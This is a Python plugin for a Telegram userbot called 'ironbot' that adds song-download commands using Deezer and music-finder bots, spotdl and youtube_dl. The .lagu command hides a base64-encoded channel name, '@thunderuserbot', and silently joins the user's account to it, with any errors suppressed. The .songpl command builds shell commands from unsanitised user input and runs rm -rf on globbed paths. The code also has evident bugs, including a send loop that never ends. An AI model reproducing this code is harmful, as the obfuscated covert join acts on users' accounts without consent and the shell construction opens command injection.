import datetime
import asyncio
from pathlib import Path
from telethon import events
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from ironbot import bot, CMD_HELP
from ironbot.events import register
import os
import subprocess
import glob
import base64
from random import randint
from ironbot.cmdhelp import CmdHelp
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url
import json
import pybase64
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos

# ██████ LANGUAGE CONSTANTS ██████ #

from ironbot.language import get_value
LANG = get_value("song")

# ████████████████████████████████ #

@register(outgoing=True, pattern="^.deez(\d*|)(?: |$)(.*)")
async def deezl(event):
    if event.fwd_from:
        return
    sira = event.pattern_match.group(1)
    if sira == '':
        sira = 0
    else:
        sira = int(sira)

    sarki = event.pattern_match.group(2)
    if len(sarki) < 1:
        if event.is_reply:
            sarki = await event.get_reply_message().text
        else:
            await event.edit(LANG['GIVE_ME_SONG']) 

    await event.edit(LANG['SEARCHING'])
    chat = "@DeezerMusicBot"
    async with bot.conversation(chat) as conv:
        try:     
            mesaj = await conv.send_message(str(randint(31,62)))
            sarkilar = await conv.get_response()
            await mesaj.edit(sarki)
            sarkilar = await conv.get_response()
        except YouBlockedUserError:
            await event.reply(LANG['BLOCKED_DEEZER'])
            return
        await event.client.send_read_acknowledge(conv.chat_id)
        if sarkilar.audio:
            await event.client.send_read_acknowledge(conv.chat_id)
            await event.client.send_message(event.chat_id, LANG['UPLOADED_WITH'], file=sarkilar.message)
            await event.delete()
        elif sarkilar.buttons[0][0].text == "No results":
            await event.edit(LANG['NOT_FOUND'])
        else:
            await sarkilar.click(sira)
            sarki = await conv.wait_event(events.NewMessage(incoming=True,from_users=595898211))
            await event.client.send_read_acknowledge(conv.chat_id)
            await event.client.send_message(event.chat_id, f"`{sarkilar.buttons[sira][0].text}` | " + LANG['UPLOADED_WITH'], file=sarki.message)
            await event.delete()



@register(outgoing=True, pattern="^.song(?: |$)(.*)")
async def FindMusicPleaseBot(event):
    song = event.pattern_match.group(1)
    chat = "@FindMusicPleaseBot"
    if not song:
        return await event.edit("```Apa yang harus saya cari?```")
    await event.edit("```Mencari lagu...```")
    await asyncio.sleep(2)
    async with bot.conversation(chat) as conv:
        await event.edit("`Sabar....`")
        try:
            await conv.send_message(song)
            response = await conv.get_response()
            if response.text.startswith("Sorry"):
                await bot.send_read_acknowledge(conv.chat_id)
                return await event.edit(f"Sorry, tidak bisa nyari lagu yang judulnya {song}")
            await conv.get_response()
            lavde = await conv.get_response()
        except YouBlockedUserError:
            await event.edit(
                "```pliss unblock``` @FindmusicpleaseBot``` dan coba lagi```"
            )
            return
        await bot.send_file(event.chat_id, lavde)
        await bot.send_read_acknowledge(conv.chat_id)
    await event.delete()


@register(outgoing=True, pattern="^.songpl ?(.*)")
async def songpl(event):
    if event.fwd_from:
        return
    DELAY_BETWEEN_EDITS = 0.3
    PROCESS_RUN_TIME = 100
    cmd = event.pattern_match.group(1)

    if len(cmd) < 1:
        await event.edit(LANG['USAGE_PL'])    

    reply_to_id = event.message.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    await event.edit(LANG['SEARCHING_PL'])
    dosya = os.getcwd() + "/playlist/" + "pl.pl"
    klasor = os.getcwd() + "/playlist/"
    sonuc = os.system(f"spotdl --playlist {cmd} --write-to=\"{dosya}\"")
    sonuc2 = os.system(f"spotdl --list {dosya} -f {klasor}")
    await event.edit(LANG['DOWNLOADED'])
    l = glob.glob(f"{klasor}/*.mp3")
    i = 0
    if len(l) >= 1:
        while i < len(l):
            await event.reply(LANG['SENDING_SONGS'] + l[i])
            await event.client.send_file(
                event.chat_id,
                l[i],
                force_document=True,
                allow_cache=False,
                caption=cmd,
                reply_to=reply_to_id
            )
    else:
        await event.edit(LANG['NOT_FOUND_PL'])   
        return 
    os.system(f"rm -rf {klasor}/*.mp3")
    subprocess.check_output(f"rm -rf {klasor}/*.mp3",shell=True)
    os.system(f"rm -rf {klasor}/*.pl")
    subprocess.check_output(f"rm -rf {klasor}/*.pl",shell=True)


@register(outgoing=True, pattern="^.lagu ?(.*)")
async def download_video(event):
    x = await event.edit("Mencari lagu...")
    url = event.pattern_match.group(1)
    if not url:
        return await event.edit("**Error**\nUsage - `.song <song name>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await event.edit("`tidak ada yang cocok zzzz...`")
    type = "audio"
    await x.edit(f"`Preparing to download {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await event.edit("`Mendapatkan informasi...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await event.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await event.edit("`The download content was too short.`")
        return
    except GeoRestrictedError:
        await event.edit(
            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
        )
        return
    except MaxDownloadsReached:
        await event.edit("`Max-downloads limit has been reached.`")
        return
    except PostProcessingError:
        await event.edit("`There was an error during post processing.`")
        return
    except UnavailableVideoError:
        await event.edit("`Media is not available in the requested format.`")
        return
    except XAttrMetadataError as XAME:
        await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await event.edit("`There was an error during info extraction.`")
        return
    except Exception as e:
        await event.edit(f"{str(type(e)): {str(e)}}\nTesssss")
        return
    try:
        sung = str(pybase64.b64decode("QHRodW5kZXJ1c2VyYm90"))[2:14]
        await bot(JoinChannelRequest(sung))
    except BaseException:
        pass
    theupload = """
Uploading...
Song name - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await event.edit(f"`{theupload}`")
    await bot.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"🎵 {rip_data['title']}\n❤ dari Ironbot️\n",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    await event.delete()
    os.remove(f"{rip_data['id']}.mp3")
    



CmdHelp('song').add_command(
    'deez', '<Judul lagu/youtube/spotify/soundcloud>', 'Cari dan unduh lagu dari banyak situs.'
).add_command(
    'song', '<Judul lagu/youtube/spotify>', 'Download lagu.'
).add_command(
    'songpl', '<spotify playlist>', 'Spotify Playlist\'mengunduh lagu dari dalam'
).add()